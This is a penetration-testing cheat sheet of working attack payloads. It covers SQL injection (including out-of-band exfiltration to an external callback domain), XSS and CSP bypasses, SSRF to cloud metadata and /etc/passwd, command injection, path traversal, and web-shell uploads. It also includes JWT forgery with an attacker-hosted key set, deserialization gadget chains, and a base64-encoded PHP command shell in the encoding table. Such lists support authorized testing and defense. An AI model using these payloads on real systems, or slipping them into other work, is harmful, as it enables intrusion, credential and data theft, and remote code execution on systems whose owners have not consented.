# Payload matrix

Curated working patterns, not an exhaustive list. Adapt to the observed parser and encoding.

## SQL injection

| Context | Probe | Notes |
| --- | --- | --- |
| String, single quote | `'` then `''` | Error vs. normal page proves quote handling |
| Boolean | `' AND 1=1-- -` / `' AND 1=2-- -` | Same page, different body length |
| Numeric | `1 AND 1=1` / `1 AND 1=2` | No quote needed |
| Time | `' AND SLEEP(5)-- -` (MySQL), `';WAITFOR DELAY '0:0:5'--` (MSSQL), `'||pg_sleep(5)--` (Postgres) | Measure three times |
| UNION | `' ORDER BY N-- -` then `' UNION SELECT 1,2,3-- -` | Match column count and types |
| Out-of-band | `' AND LOAD_FILE(CONCAT('\\\\',(SELECT version()),'.OAST_DOMAIN\\a'))-- -` | MySQL only with FILE priv |
| WAF-aware | `/*!50000SELECT*/`, `%0a`, `+`, `%00`, case mixing, `UNION%0aSELECT` | Confirm the backend still parses it |

## Cross-site scripting

| Context | Probe |
| --- | --- |
| HTML text | `<script>alert(document.domain)</script>`, `<img src=x onerror=alert(1)>` |
| Attribute | `" autofocus onfocus=alert(1) x="` |
| JavaScript string | `';alert(1)//`, `\';alert(1)//` |
| URL in href | `javascript:alert(1)`, `data:text/html,<script>alert(1)</script>` |
| DOM sink | `#<img src=x onerror=alert(1)>` against `innerHTML`, `location`, `eval` |
| Template literal | `${alert(1)}` |
| CSP bypass | JSONP endpoint on allowlisted host, `base-uri` missing, Angular/Vue gadget if framework present |

Alert boxes prove execution only when the sink is user-reachable without your own browser extensions. For stored XSS, capture the sink page and the storage request.

## SSRF

```
http://127.0.0.1:80
http://127.1
http://0x7f.0.0.1
http://2130706433
http://[::1]
http://localtest.me
http://169.254.169.254/latest/meta-data/
http://metadata.google.internal/computeMetadata/v1/
file:///etc/passwd
gopher://127.0.0.1:6379/_INFO
dict://127.0.0.1:11211/stat
```

## Command injection

```
;id
|id
||id
&id
`id`
$(id)
%0aid
; ping -c 1 OAST_DOMAIN
```

Argument injection: a program invoked as `convert INPUT OUTPUT` can be fed `INPUT` = `-write /var/www/shell.php`, `--output`, or `@file`.

## Path traversal

```
../../../../etc/passwd
..%2f..%2f..%2fetc%2fpasswd
..%252f..%252fetc%252fpasswd
....//....//etc/passwd
..\..\..\windows\win.ini
%2e%2e%2f%2e%2e%2fetc%2fpasswd
```

## File upload

```
shell.php
shell.php.jpg
shell.phtml
shell.pHp
shell.php%00.jpg
shell.php;.jpg
.htaccess  ->  AddType application/x-httpd-php .jpg
.user.ini  ->  auto_prepend_file=shell.jpg
web.config ->  handler mapping for .jpg
```

Polyglot: GIF89a header + PHP body; JPEG comment segment carrying a payload; SVG with `onload`.

## JWT

```
{"alg":"none"}                      # header rewrite, empty signature
HS256 signed with the server's RSA public key (PEM as HMAC secret)
kid: ../../../../dev/null           # empty key
kid: ' UNION SELECT 'secret'-- -    # SQL-backed key lookup
jku: https://OAST_DOMAIN/jwks.json  # attacker-hosted key set
```

## Deserialization

| Runtime | Tool | Trigger |
| --- | --- | --- |
| Java | ysoserial | `ObjectInputStream`, CommonsCollections, Spring, Groovy, JDK7u21 |
| .NET | ysoserial.net | `BinaryFormatter`, `TypeConfuseDelegate`, `ObjectDataProvider` |
| PHP | phpggc | `unserialize()`, Laravel/Symfony/Guzzle chains |
| Python | hand-built | `pickle.loads`, `yaml.load` (unsafe loader) |
| Ruby | universal gadget | `Marshal.load` |

## Encoding quick reference

```
URL:        %20 %2f %27 %22 %00
Double URL: %2520 %252f
Unicode:    %u0027 %u2215
HTML:       &#39; &#x27; &quot;
JS unicode: \u0027 \x27
Base64:     PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+
Hex:        3c7363726970743e
Overlong:   %c0%af, %e0%80%af
```

Chunked transfer, HTTP/1.1 request smuggling, and parameter pollution (`?id=1&id=2`) belong to parser-differential testing: send the request twice through two parsers and look for disagreement.
